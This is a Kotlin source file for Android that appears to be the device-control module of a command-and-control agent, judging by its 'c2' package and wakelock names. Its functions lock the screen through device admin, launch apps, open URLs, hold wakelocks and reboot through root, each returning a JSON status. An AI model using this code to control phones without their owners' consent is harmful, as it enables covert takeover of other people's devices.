package com.outcome.c2

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.PowerManager
import org.json.JSONObject

object SystemControl {

    /** Lock the screen using DevicePolicyManager if admin, else fallback. */
    fun lockScreen(ctx: Context): JSONObject {
        return try {
            val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = ComponentName(ctx, AdminReceiver::class.java)
            if (dpm.isAdminActive(admin)) {
                dpm.lockNow()
                JSONObject().put("ok", true).put("method", "dpm")
            } else {
                // Fallback: use accessibility service if active
                JSONObject().put("error", "device_admin_not_active — enable admin in-app")
            }
        } catch (e: Exception) {
            JSONObject().put("error", e.message ?: "lock_failed")
        }
    }

    /** Launch any app by package name. */
    fun openApp(ctx: Context, pkg: String): JSONObject {
        return try {
            val intent = ctx.packageManager.getLaunchIntentForPackage(pkg)
            if (intent == null) JSONObject().put("error", "package_not_found")
            else {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                ctx.startActivity(intent)
                JSONObject().put("ok", true).put("package", pkg)
            }
        } catch (e: Exception) {
            JSONObject().put("error", e.message ?: "open_failed")
        }
    }

    /** Open URL in default browser. */
    fun openUrl(ctx: Context, url: String): JSONObject {
        return try {
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            ctx.startActivity(intent)
            JSONObject().put("ok", true).put("url", url)
        } catch (e: Exception) {
            JSONObject().put("error", e.message ?: "open_url_failed")
        }
    }

    /** Show screen-on wakelock for N ms. */
    fun wakeLock(ctx: Context, ms: Long): JSONObject {
        return try {
            val pm = ctx.getSystemService(Context.POWER_SERVICE) as PowerManager
            val lock = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK, "c2:wake")
            lock.acquire(ms)
            JSONObject().put("ok", true).put("duration", ms)
        } catch (e: Exception) {
            JSONObject().put("error", e.message ?: "wakelock_failed")
        }
    }

    /** Reboot (requires root). */
    fun reboot(): JSONObject {
        return try {
            val p = Runtime.getRuntime().exec(arrayOf("su", "-c", "reboot"))
            p.waitFor()
            JSONObject().put("ok", true)
        } catch (e: Exception) {
            JSONObject().put("error", e.message ?: "reboot_failed")
        }
    }
}
